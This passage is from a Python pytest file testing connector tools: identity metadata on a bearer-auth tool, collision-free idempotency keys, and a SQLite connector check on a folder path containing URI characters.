        env=(EnvVar("DEMO_URL", "Address.", secret=False),),
        auth=(BearerAuth(EnvVar("DEMO_TOKEN", "Token."), identity="user"),),
        operations=(CREATE,),
    )
    [tool] = connector_tools(person, env=ENV, config={}, transport=MockTransport())
    assert (tool.metadata or {})["awa_identity"] == "user"  # read by the tool result cache


def test_idempotency_key_parts_cannot_collide() -> None:
    base = {"scope": "t", "tool_call_id": "c", "operation": "o", "tenant": None, "namespace": ""}
    assert idempotency_key(**{**base, "scope": "a", "tool_call_id": "bc"}) != idempotency_key(
        **{**base, "scope": "ab", "tool_call_id": "c"}
    )


@pytest.mark.parametrize("missing", ["scope", "tool_call_id", "operation"])
def test_idempotency_key_needs_scope_call_id_and_operation(missing: str) -> None:
    parts = {"scope": "t", "tool_call_id": "c", "operation": "o", missing: ""}
    with pytest.raises(ValueError):
        idempotency_key(**parts)


def test_the_sql_check_opens_a_database_in_a_folder_with_uri_characters(tmp_path: Path) -> None:
    folder = tmp_path / "Q#1 50%"
    folder.mkdir()
    with contextlib.closing(sqlite3.connect(folder / "ledger.db")) as connection:
        connection.execute("CREATE TABLE invoices (id INTEGER)")
        connection.commit()

    result = check_connector("sql", env={"DATABASE_URL": f"sqlite:///{folder / 'ledger.db'}"})

    assert result.ok and "invoices" in result.message
